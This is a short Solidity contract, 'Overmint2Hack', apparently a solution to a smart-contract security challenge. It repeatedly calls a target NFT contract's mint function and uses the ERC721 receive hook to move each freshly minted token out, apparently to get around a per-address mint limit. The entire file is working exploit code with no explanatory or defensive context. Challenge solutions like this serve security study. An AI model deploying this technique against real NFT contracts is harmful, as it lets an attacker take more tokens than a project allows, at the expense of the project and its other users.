// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

interface IMint is IERC721 {
    function mint() external;
}

contract Overmint2Hack {
    IMint public immutable nftContract;

    constructor(address _addressToHack) {
        nftContract = IMint(_addressToHack);
    }

    function hackMint() external {
        for (uint256 i = 0; i < 5; i++) {
            nftContract.mint();
        }
    }

    /**
     * @dev See {IERC721Receiver-onERC721Received}.
     */
    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external returns (bytes4) {
        nftContract.transferFrom(address(this), msg.sender, tokenId);
        return
            bytes4(
                keccak256("onERC721Received(address,address,uint256,bytes)")
            );
    }
}
